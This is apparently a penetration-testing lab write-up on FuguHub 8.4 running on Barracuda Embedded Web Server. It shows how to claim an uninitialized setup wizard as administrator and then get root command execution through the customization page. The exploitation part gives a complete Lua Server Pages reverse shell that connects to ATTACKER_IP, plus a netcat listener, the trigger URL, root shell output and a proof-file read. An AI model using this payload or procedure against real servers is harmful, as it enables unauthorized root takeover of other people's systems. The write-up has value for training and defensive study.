# FuguHub

FuguHub `8.4` on Barracuda Embedded Web Server can expose an uninitialized setup wizard. After setting the administrator account, the authenticated customization page can execute Lua Server Pages, yielding command execution as root.

## Discovery

Nmap indicators:

```text
8082/tcp open  http       Barracuda Embedded Web Server
| http-methods:
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
| http-webdav-scan:
|   Server Type: BarracudaServer.com (Posix)
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|_http-title: Home
```

Browse to:

```text
http://TARGET:8082
```

If the instance is uninitialized, it redirects to:

```text
http://TARGET:8082/Config-Wizard/wizard/SetAdmin.lsp
```

Set the administrator account new username and password

Successful setup:

```text
You have successfully set the administrator account.
```

The setup page disclosed the user database path:

```text
/var/www/html/user.dat
```

## Version and WFS

Follow: https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697

```text
http://TARGET:8082/rtl/protected/wfslinks.lsp
http://TARGET:8082/fs/
```

The about page identified the product:

```text
http://TARGET:8082/rtl/about.lsp
FuguHub 8.4
```

FuguHub was powered by:

```text
Barracuda Embedded Web Server
SharkSSL Embedded SSL Stack
Lua Server Pages
```

## Authenticated Lua Server Pages RCE

The customization page allows editing page content:

```text
http://TARGET:8082/rtl/protected/admin/customize.lsp
```

Replace a harmless dynamic block such as `<?lsp=bd.version?>` with a Lua reverse shell:

```lua
<?lsp if request:method() == "GET" then ?>
    <?lsp
        local host, port = "ATTACKER_IP", 8082
        local socket = require("socket")
        local tcp = socket.tcp()
        local io = require("io")
        local connection, err = tcp:connect(host, port)

        if not connection then
            print("Error connecting: " .. err)
            return
        end

        while true do
            local cmd, status, partial = tcp:receive()
            if status == "closed" or status == "timeout" then break end
            if cmd then
                local f = io.popen(cmd, "r")
                local s = f:read("*a")
                f:close()
                tcp:send(s)
            end
        end

        tcp:close()
    ?>
<?lsp else ?>
    Wrong request method, goodBye!
<?lsp end ?>
```

Start a listener:

```bash
nc -nlvp 8082
```

Trigger the payload by browsing to:

```text
http://TARGET:8082/rtl/about.lsp
```

Successful shell context:

```text
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET] PORT
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/var/www/html
```

This behaves like a command shell over the socket. Use direct commands such as:

```bash
cat /root/proof.txt
```
